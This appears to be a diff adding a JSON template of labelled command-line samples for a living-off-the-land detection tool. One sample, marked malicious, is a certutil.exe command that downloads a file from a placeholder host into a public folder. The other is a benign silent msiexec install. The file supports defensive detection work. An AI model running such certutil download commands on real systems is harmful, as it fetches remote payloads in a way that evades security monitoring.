@@ -1,0 +1,11 @@
+{
+  "tool": "lotl-command-analyzer",
+  "provenance": "template",
+  "authoredByToolAuthor": true,
+  "threshold": "medium",
+  "description": "FORMAT EXAMPLE ONLY. One command line per sample. label: malicious (confirmed by investigation) or benign (known legitimate activity).",
+  "samples": [
+    { "id": "edr-1", "source": "EDR alert, closed as true positive", "label": "malicious", "cmd": "certutil.exe -urlcache -split -f http://example.com/a.txt C:\\Users\\Public\\a.txt" },
+    { "id": "sccm-1", "source": "software deployment", "label": "benign", "cmd": "msiexec /i \\\\fileserver\\packages\\7zip.msi /qn" }
+  ]
+}
